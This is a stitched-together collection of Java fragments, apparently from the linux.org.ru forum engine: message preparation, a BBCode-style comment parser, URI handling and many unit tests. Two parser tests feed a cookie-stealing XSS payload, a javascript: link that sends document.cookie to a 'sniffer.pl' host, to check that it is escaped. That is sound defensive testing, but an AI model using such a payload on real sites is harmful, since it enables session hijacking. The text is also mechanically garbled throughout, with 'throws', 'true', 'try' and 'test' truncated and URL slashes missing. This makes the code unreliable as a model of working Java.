public PreparedMessage prepareMessage ( Message message , boolean minimizeCut , boolean secure ) { return prepareMessage ( message , messageDao . getTags ( message ) , minimizeCut , null , secure ) ; } 
public PreparedMessage prepareMessage ( Message message , List < String > ags , PreparedPoll newPoll , boolean secure ) { return prepareMessage ( message , ags , false , newPoll , secure ) ; } 
private PreparedMessage prepareMessage ( Message message , List < String > ags , boolean minimizeCut , PreparedPoll poll , boolean secure ) { ry { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
public PreparedComment prepareComment ( Comment comment , String message , boolean secure ) hrows UserNotFoundException { User author = userDao . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = lorCodeService . parseComment ( message , secure ) ; return new PreparedComment ( comment , author , processedMessage , null ) ; } 
public List < PreparedMessage > prepareMessages ( List < Message > messages , boolean secure ) { List < PreparedMessage > pm = new ArrayList < PreparedMessage > ( messages . size ( ) ) ; for ( Message message : messages ) { PreparedMessage preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , rue , null , secure ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public ModelAndView uncommitForm ( HttpServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Message message = messageDao . getById ( msgid ) ; checkUncommitable ( message ) ; ModelAndView mv = new ModelAndView ( " uncommit " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " preparedMessage " , prepareService . prepareMessage ( message , false , request . isSecure ( ) ) ) ; return mv ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! mpl . isSessionAuthorized ( ) ) { hrow new UserNotFoundException ( nick ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = mpl . isSessionAuthorized ( ) & & mpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | mpl . isModeratorSession ( ) ) ; if ( mpl . isSessionAuthorized ( ) & & ! currentUser ) { mv . getModel ( ) . put ( " ignoreList " , ignoreListDao . get ( mpl . getCurrentUser ( ) ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : lorCodeService . parseComment ( userinfo , request . isSecure ( ) ) ) ; return mv ; } 
public String mapRow ( ResultSet resultSet , int i ) hrows SQLException { String ext = resultSet . getString ( " message " ) ; boolean isLorcode = resultSet . getBoolean ( " bbcode " ) ; if ( isLorcode ) { return lorCodeService . parseComment ( ext , secure ) ; 
public List < RepliesListItem > getRepliesForUser ( User user , boolean showPrivate , int opics , int offset , final boolean readMessage , final boolean secure ) { String queryString ; if ( showPrivate ) { queryString = queryAllRepliesForUser ; } else { queryString = queryRepliesForUserWihoutPrivate ; } return jdbcTemplate . query ( queryString , new RowMapper < RepliesListItem > ( ) { @Override 
public String parseComment ( String ext , boolean secure ) { return defaultParser . parseRoot ( prepareCommentRootNode ( secure ) , ext ) . renderXHtml ( ) ; } 
public ParserResult parseCommentWithReplies ( String ext , boolean secure ) { RootNode rootNode = defaultParser . parseRoot ( prepareCommentRootNode ( secure ) , ext ) ; Set < User > replier = rootNode . getReplier ( ) ; String html = rootNode . renderXHtml ( ) ; return new ParserResult ( html , replier ) ; } 
public String parseTopicWithMinimizedCut ( String ext , String cutURL , boolean secure ) { return defaultParser . parseRoot ( prepareTopicRootNode ( rue , cutURL , secure ) , ext ) . renderXHtml ( ) ; } 
public String parseTopic ( String ext , boolean secure ) { return defaultParser . parseRoot ( prepareTopicRootNode ( false , null , secure ) , ext ) . renderXHtml ( ) ; } 
private RootNode prepareCommentRootNode ( boolean secure ) { RootNode rootNode = defaultParser . getRootNode ( ) ; rootNode . setCommentCutOptions ( ) ; rootNode . setUserDao ( userDao ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( oHtmlFormatter ) ; return rootNode ; } 
private RootNode prepareTopicRootNode ( boolean minimizeCut , String cutURL , boolean secure ) { RootNode rootNode = defaultParser . getRootNode ( ) ; if ( minimizeCut ) { ry { LorURI cutURI = new LorURI ( configuration . getMainURI ( ) , cutURL ) ; if ( cutURI . isTrueLorUrl ( ) ) { URI fixURI = new URI ( cutURI . fixScheme ( secure ) , rue , " UTF-8 " ) ; rootNode . setMinimizedTopicCutOptions ( fixURI ) ; } else { rootNode . setMaximizedTopicCutOptions ( ) ; } } catch ( Exception e ) { rootNode . setMaximizedTopicCutOptions ( ) ; } } else { rootNode . setMaximizedTopicCutOptions ( ) ; } rootNode . setUserDao ( userDao ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( oHtmlFormatter ) ; return rootNode ; } 
public boolean isComment ( ) { return cutType = = ParserParameters . CutType . INCOMMENT ; } 
public boolean isTopicMinimized ( ) { return cutType = = ParserParameters . CutType . INTOPIC_MINIMIZED ; } 
public boolean isTopicMaximized ( ) { return cutType = = ParserParameters . CutType . INTOPIC_MAXIMIZED ; } 
public void init ( ) { lorCodeService = new LorCodeService ( ) ; } 
public void pTest ( ) { Assert . assertEquals ( " <p>test ntest1</p><p>test2</p> " , lorCodeService . parseComment ( " est ntest1 ntest2 " , false ) ) ; 
public void agEscapeTest ( ) { Assert . assertEquals ( " <p>&lt;br&gt;</p> " , lorCodeService . parseComment ( " <br> " , false ) ) ; 
public void urlEscapeTest ( ) { Assert . assertEquals ( " <p><s>Test</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]Test[/url] " , false ) ) ; 
public void urlEscapeWithTagsTest ( ) { Assert . assertEquals ( " <p><s>T<i>e</i>st</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]T[i]e[/i]st[/url] " , false ) ) ; 
public void badListTest ( ) { Assert . assertEquals ( " <p>0</p><ul><li>1</li><li>2</li></ul> " , lorCodeService . parseComment ( " [list]0[*]1[*]2[/list] " , false ) ) ; 
public void codeEscapeTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>&quot;code&amp;code&quot;</code></pre></div> " , lorCodeService . parseComment ( " [code] \" code&code \" [/code] " , false ) ) ; 
public void init ( ) hrows Exception { maxcom = mock ( User . class ) ; JB = mock ( User . class ) ; isden = mock ( User . class ) ; when ( maxcom . isBlocked ( ) ) . henReturn ( false ) ; when ( JB . isBlocked ( ) ) . henReturn ( false ) ; when ( isden . isBlocked ( ) ) . henReturn ( rue ) ; userDao = mock ( UserDao . class ) ; when ( userDao . getUser ( " maxcom " ) ) . henReturn ( maxcom ) ; when ( userDao . getUser ( " JB " ) ) . henReturn ( JB ) ; when ( userDao . getUser ( " isden " ) ) . henReturn ( isden ) ; when ( userDao . getUser ( " hizel " ) ) . henThrow ( new UserNotFoundException ( " hizel " ) ) ; mainUrl = " http:127.0.0.1:8080/ " ; mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; configuration = mock ( Configuration . class ) ; when ( configuration . getMainURI ( ) ) . henReturn ( mainURI ) ; when ( configuration . getMainUrl ( ) ) . henReturn ( mainUrl ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . userDao = userDao ; lorCodeService . configuration = configuration ; url = " http:127.0.0.1:8080/forum/talks/22464 " ; } 
public void brTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [br] " , false ) , " <p><br></p> " ) ; } 
public void boldTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [b]hello world[/b] " , false ) , " <p><b>hello world</b></p> " ) ; } 
public void italicTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [i]hello world[/i] " , false ) , " <p><i>hello world</i></p> " ) ; } 
public void strikeoutTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [s]hello world[/s] " , false ) , " <p><s>hello world</s></p> " ) ; } 
public void emphasisTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [strong]hello world[/strong] " , false ) , " <p><strong>hello world</strong></p> " ) ; } 
public void quoteCleanTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [quote][/quote] " , false ) , " " ) ; } 
public void urlTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [url]http:linux.org.ru[/url] " , false ) , " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " ) ; } 
public void urlParamTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [url=http:linux.org.ru]linux[/url] " , false ) , " <p><a href= \" http:linux.org.ru \" >linux</a></p> " ) ; } 
public void urlParamWithTagTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [url=http:linux.org.ru][b]l[/b]inux[/url] " , false ) , " <p><a href= \" http:linux.org.ru \" ><b>l</b>inux</a></p> " ) ; } 
public void urlParamWithTagTest2 ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [url=http:linux.org.ru][b]linux[/b][/url] " , false ) , " <p><a href= \" http:linux.org.ru \" ><b>linux</b></a></p> " ) ; } 
public void listTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [list][*]one[*]two[*]three[/list] " , false ) , " <ul><li>one</li><li>two</li><li>three</li></ul> " ) ; } 
public void codeTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [code][list][*]one[*]two[*]three[/list][/code] " , false ) , " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " ) ; } 
public void codeCleanTest ( ) { Assert . assertEquals ( " " , lorCodeService . parseComment ( " [code][/code] " , false ) ) ; } 
public void codeKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" language-cpp \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , lorCodeService . parseComment ( " [code=cxx]#include <stdio.h>[/code] " , false ) ) ; 
public void codeUnKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , lorCodeService . parseComment ( " [code=foo]#include <stdio.h>[/code] " , false ) ) ; 
public void spacesTest ( ) { Assert . assertEquals ( " <p>some text</p><p> some again text <a href= \" http:example.com \" >example</a> example</p> " , lorCodeService . parseComment ( " some text n some again text [url=http:example.com]example[/url] example " , false ) ) ; 
public void userTest ( ) hrows Exception { Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href='/people/maxcom/profile'>maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/user] " , false ) ) ; Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href='/people/isden/profile'>isden</a></s></span></p> " , lorCodeService . parseComment ( " [user]isden[/user] " , false ) ) ; Assert . assertEquals ( " <p><s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/user] " , false ) ) ; 
public void cut4Test ( ) { Assert . assertEquals ( " <div id= \" cut0 \" ><p>test</p></div><div id= \" cut1 \" ><p>test</p></div> " , lorCodeService . parseTopic ( " [cut] ntest[/cut][cut]test[/cut] " , false ) ) ; 
public void initTest ( ) hrows Exception { userDao = mock ( UserDao . class ) ; user = mock ( User . class ) ; when ( user . isBlocked ( ) ) . henReturn ( false ) ; when ( userDao . getUser ( " splinter " ) ) . henReturn ( user ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . userDao = userDao ; } 
public void urlTest0 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><p>linux.org.ru</p></a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru] nlinux.org.ru[/url] " , false ) ) ; Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url] nhttp:linux.org.ru[/url] " , false ) ) ; 
public void urlTest1 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][/url] " , false ) ) ; 
public void splinterTest1 ( ) { http:www.linux.org.ru/forum/linux-org-ru/6448266 Assert.assertEquals(lorCodeService.parseComment("[url=http:www.fishing.org/][user]splinter[/user][/url]", false), "<p><a href=\"http:www.fishing.org/\">http:www.fishing.org/</a><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href='/people/splinter/profile'>splinter</a></span></p>"); 
public List < PreparedMessage > prepareMessagesFeed ( List < Message > messages , boolean secure ) { List < PreparedMessage > pm = new ArrayList < PreparedMessage > ( messages . size ( ) ) ; for ( Message message : messages ) { PreparedMessage preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , rue , null , secure ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public String renderNodeXhtml ( Node node ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( xtNode . getText ( ) ) . rim ( ) ; String result ; TagNode agNode = ( TagNode ) node ; RootNode rootNode = agNode . getRootNode ( ) ; ToHtmlFormatter oHtmlFormatter = rootNode . getToHtmlFormatter ( ) ; boolean secure = rootNode . isSecure ( ) ; UserDao userDao = rootNode . getUserDao ( ) ; ry { if ( userDao ! = null & & oHtmlFormatter ! = null ) { User user = rootNode . getUserDao ( ) . getUser ( memberName ) ; if ( ! user . isBlocked ( ) ) { result = String . format ( " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" %s \" >%s</a></span> " , oHtmlFormatter . memberURL ( user , secure ) , Parser . escape ( memberName ) ) ; rootNode . addReplier ( user ) ; } else { result = String . format ( " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href= \" %s \" >%s</a></s></span> " , oHtmlFormatter . memberURL ( user , secure ) , Parser . escape ( memberName ) ) ; } } else { result = Parser . escape ( memberName ) ; } } catch ( Exception ex ) { result = String . format ( " <s>%s</s> " , Parser . escape ( memberName ) ) ; } return result ; } 
public String memberURL ( User user , boolean secure ) hrows URIException { URI mainUri = configuration . getMainURI ( ) ; String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } return ( new URI ( scheme , null , mainUri . getHost ( ) , mainUri . getPort ( ) , String . format ( " /people/%s/profile " , user . getNick ( ) ) ) ) . getEscapedURIReference ( ) ; } 
public void init ( ) hrows Exception { maxcom = mock ( User . class ) ; JB = mock ( User . class ) ; isden = mock ( User . class ) ; when ( maxcom . isBlocked ( ) ) . henReturn ( false ) ; when ( JB . isBlocked ( ) ) . henReturn ( false ) ; when ( isden . isBlocked ( ) ) . henReturn ( rue ) ; when ( maxcom . getNick ( ) ) . henReturn ( " maxcom " ) ; when ( JB . getNick ( ) ) . henReturn ( " JB " ) ; when ( isden . getNick ( ) ) . henReturn ( " isden " ) ; userDao = mock ( UserDao . class ) ; when ( userDao . getUser ( " maxcom " ) ) . henReturn ( maxcom ) ; when ( userDao . getUser ( " JB " ) ) . henReturn ( JB ) ; when ( userDao . getUser ( " isden " ) ) . henReturn ( isden ) ; when ( userDao . getUser ( " hizel " ) ) . henThrow ( new UserNotFoundException ( " hizel " ) ) ; mainUrl = " http:127.0.0.1:8080/ " ; mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; configuration = mock ( Configuration . class ) ; when ( configuration . getMainURI ( ) ) . henReturn ( mainURI ) ; when ( configuration . getMainUrl ( ) ) . henReturn ( mainUrl ) ; oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setConfiguration ( configuration ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . userDao = userDao ; lorCodeService . configuration = configuration ; lorCodeService . oHtmlFormatter = oHtmlFormatter ; url = " http:127.0.0.1:8080/forum/talks/22464 " ; } 
public void userTest ( ) hrows Exception { Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" http:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/user] " , false ) ) ; Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href= \" http:127.0.0.1:8080/people/isden/profile \" >isden</a></s></span></p> " , lorCodeService . parseComment ( " [user]isden[/user] " , false ) ) ; Assert . assertEquals ( " <p><s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/user] " , false ) ) ; 
public void parserResultTest ( ) hrows Exception { String msg = " [user]hizel[/user][user]JB[/user][user]maxcom[/user] " ; Set < User > replier = lorCodeService . getReplierFromMessage ( msg ) ; String html = lorCodeService . parseComment ( msg , rue ) ; Assert . assertTrue ( replier . contains ( maxcom ) ) ; Assert . assertTrue ( replier . contains ( JB ) ) ; Assert . assertFalse ( replier . contains ( isden ) ) ; Assert . assertEquals ( " <p><s>hizel</s><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" https:127.0.0.1:8080/people/JB/profile \" >JB</a></span><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" https:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , html ) ; } 
public void initTest ( ) hrows Exception { userDao = mock ( UserDao . class ) ; user = mock ( User . class ) ; when ( user . isBlocked ( ) ) . henReturn ( false ) ; when ( user . getNick ( ) ) . henReturn ( " splinter " ) ; when ( userDao . getUser ( " splinter " ) ) . henReturn ( user ) ; mainUrl = " http:127.0.0.1:8080/ " ; mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; configuration = mock ( Configuration . class ) ; when ( configuration . getMainURI ( ) ) . henReturn ( mainURI ) ; when ( configuration . getMainUrl ( ) ) . henReturn ( mainUrl ) ; oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setConfiguration ( configuration ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . userDao = userDao ; lorCodeService . configuration = configuration ; lorCodeService . oHtmlFormatter = oHtmlFormatter ; } 
public void splinterTest1 ( ) { http:www.linux.org.ru/forum/linux-org-ru/6448266 Assert.assertEquals(lorCodeService.parseComment("[url=http:www.fishing.org/][user]splinter[/user][/url]", false), "<p><a href=\"http:www.fishing.org/\">http:www.fishing.org/</a><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href=\"http:127.0.0.1:8080/people/splinter/profile\">splinter</a></span></p>"); 
public String oUnEscapedString ( ) { ry { return lorURI . getURIReference ( ) ; 
public String formatUrlBody ( int maxLength ) hrows URIException { String all = lorURI . getURIReference ( ) ; String scheme = lorURI . getScheme ( ) ; String uriWithoutScheme = all . substring ( scheme . length ( ) + 3 ) ; if ( uriWithoutScheme . length ( ) < maxLength ) { return uriWithoutScheme ; 
public String fixScheme ( boolean secure ) hrows URIException { if ( ! isTrueLorUrl ) { return oString ( ) ; } String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = lorURI . getHost ( ) ; int port = lorURI . getPort ( ) ; String path = lorURI . getPath ( ) ; String query = lorURI . getQuery ( ) ; String fragment = lorURI . getFragment ( ) ; URI fixUri = new URI ( scheme , null , host , port , path , query , fragment ) ; return fixUri . getEscapedURI ( ) ; } 
public void init ( ) hrows Exception { mainURI = new URI ( " http:www.linux.org.ru/ " , rue , " UTF-8 " ) ; configuration = mock ( Configuration . class ) ; when ( configuration . getMainURI ( ) ) . henReturn ( mainURI ) ; oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setConfiguration ( configuration ) ; oHtmlFormatter20 = new ToHtmlFormatter ( ) ; oHtmlFormatter20 . setConfiguration ( configuration ) ; oHtmlFormatter20 . setMaxLength ( 20 ) ; oLorCodeTexFormatter = new ToLorCodeTexFormatter ( ) ; oLorCodeFormatter = new ToLorCodeFormatter ( ) ; } 
public void initTest ( ) hrows Exception { mainURI = new URI ( " http:127.0.0.1:8080/ " , rue , " UTF-8 " ) ; mainLORURI = new URI ( " http:www.linux.org.ru/ " , rue , " UTF-8 " ) ; messageDao = mock ( MessageDao . class ) ; message1 = mock ( Message . class ) ; group1 = mock ( Group . class ) ; message2 = mock ( Message . class ) ; group2 = mock ( Group . class ) ; message3 = mock ( Message . class ) ; group3 = mock ( Group . class ) ; message12 = mock ( Message . class ) ; group12 = mock ( Group . class ) ; when ( group1 . getUrl ( ) ) . henReturn ( " /news/debian/ " ) ; when ( group2 . getUrl ( ) ) . henReturn ( " /forum/talks/ " ) ; when ( group3 . getUrl ( ) ) . henReturn ( " /forum/general/ " ) ; when ( group12 . getUrl ( ) ) . henReturn ( " /forum/security/ " ) ; when ( messageDao . getGroup ( message1 ) ) . henReturn ( group1 ) ; when ( messageDao . getGroup ( message2 ) ) . henReturn ( group2 ) ; when ( messageDao . getGroup ( message3 ) ) . henReturn ( group3 ) ; when ( messageDao . getGroup ( message12 ) ) . henReturn ( group12 ) ; when ( messageDao . getById ( 6753486 ) ) . henReturn ( message1 ) ; when ( messageDao . getById ( 6893165 ) ) . henReturn ( message2 ) ; when ( messageDao . getById ( 6890857 ) ) . henReturn ( message3 ) ; when ( messageDao . getById ( 1948661 ) ) . henReturn ( message12 ) ; } 
public String fixScheme ( boolean secure ) hrows URIException { if ( ! isTrueLorUrl ) { return oString ( ) ; } String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = lorURI . getHost ( ) ; int port = lorURI . getPort ( ) ; String path = lorURI . getPath ( ) ; String query = lorURI . getQuery ( ) ; String fragment = lorURI . getFragment ( ) ; URI fixUri = new URI ( scheme , null , host , port , path , query , fragment ) ; return fixUri . getEscapedURIReference ( ) ; } 
public void est1 ( ) hrows Exception { LorURI lorURI = new LorURI ( mainURI , url1 ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486#comment-6753612 " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486#comment-6753612 " , lorURI . fixScheme ( rue ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public void est2 ( ) hrows Exception { LorURI lorURI = new LorURI ( mainURI , url2 ) ; assertEquals ( 6893165 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/talks/6893165?lastmod=1319027964738 " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/talks/6893165?lastmod=1319027964738 " , lorURI . fixScheme ( rue ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/talks/6893165 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/talks/6893165 " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public void est3 ( ) hrows Exception { LorURI lorURI = new LorURI ( mainURI , url3 ) ; assertEquals ( 6890857 , lorURI . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " , lorURI . fixScheme ( rue ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public void est1 ( ) hrows Exception { LorURI lorURI = new LorURI ( mainURI , url1 ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486#comment-6753612 " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486#comment-6753612 " , lorURI . fixScheme ( rue ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public void est1n ( ) hrows Exception { LorURI lorURI = new LorURI ( mainURI , url1n ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . fixScheme ( rue ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public String fixScheme ( boolean secure ) hrows URIException { if ( ! isTrueLorUrl ) { return oString ( ) ; } String host = lorURI . getHost ( ) ; int port = lorURI . getPort ( ) ; String path = lorURI . getPath ( ) ; String query = lorURI . getQuery ( ) ; String fragment = lorURI . getFragment ( ) ; if ( ! secure ) { return ( new HttpURL ( null , host , port , path , query , fragment ) ) . getEscapedURIReference ( ) ; 
public void est13 ( ) hrows Exception { String url13_1 = " http:www.linux.org.ru/view-news.jsp?tag=c%2B%2B " ; String url13_2 = " http:www.linux.org.ru/view-news.jsp?tag=c++ " ; String url13_3 = " http:www.linux.org.ru/view-news.jsp?tag=c+c " ; LorURI lorURI1 = new LorURI ( mainLORURI , url13_1 ) ; LorURI lorURI2 = new LorURI ( mainLORURI , url13_2 ) ; LorURI lorURI3 = new LorURI ( mainLORURI , url13_3 ) ; assertEquals ( " https:www.linux.org.ru/view-news.jsp?tag=c++ " , lorURI1 . fixScheme ( rue ) ) ; assertEquals ( " http:www.linux.org.ru/view-news.jsp?tag=c++ " , lorURI1 . fixScheme ( false ) ) ; assertEquals ( " https:www.linux.org.ru/view-news.jsp?tag=c%20%20 " , lorURI2 . fixScheme ( rue ) ) ; assertEquals ( " http:www.linux.org.ru/view-news.jsp?tag=c%20%20 " , lorURI2 . fixScheme ( false ) ) ; assertEquals ( " http:www.linux.org.ru/view-news.jsp?tag=c%20c " , lorURI3 . fixScheme ( false ) ) ; assertEquals ( " https:www.linux.org.ru/view-news.jsp?tag=c%20c " , lorURI3 . fixScheme ( rue ) ) ; } 
public void est14 ( ) hrows Exception { String url14_1 = " https:www.linux.org.ru/jump-message.jsp?msgid=6890857&cid=6892917 " ; String url14_2 = " https:127.0.0.1:8080/jump-message.jsp?msgid=6890857&cid=6892917 " ; LorURI lorURI1 = new LorURI ( mainLORURI , url14_1 ) ; LorURI lorURI2 = new LorURI ( mainURI , url14_2 ) ; assertEquals ( 6890857 , lorURI1 . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI1 . getCommentId ( ) ) ; assertTrue ( lorURI1 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI1 . isMessageUrl ( ) ) ; assertTrue ( lorURI1 . isCommentUrl ( ) ) ; assertEquals ( " http:www.linux.org.ru/jump-message.jsp?msgid=6890857&cid=6892917 " , lorURI1 . fixScheme ( false ) ) ; assertEquals ( " https:www.linux.org.ru/jump-message.jsp?msgid=6890857&cid=6892917 " , lorURI1 . fixScheme ( rue ) ) ; assertEquals ( " http:www.linux.org.ru/forum/general/6890857?cid=6892917 " , lorURI1 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:www.linux.org.ru/forum/general/6890857?cid=6892917 " , lorURI1 . formatJump ( messageDao , rue ) ) ; assertEquals ( 6890857 , lorURI2 . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI2 . getCommentId ( ) ) ; assertTrue ( lorURI2 . isTrueLorUrl ( ) 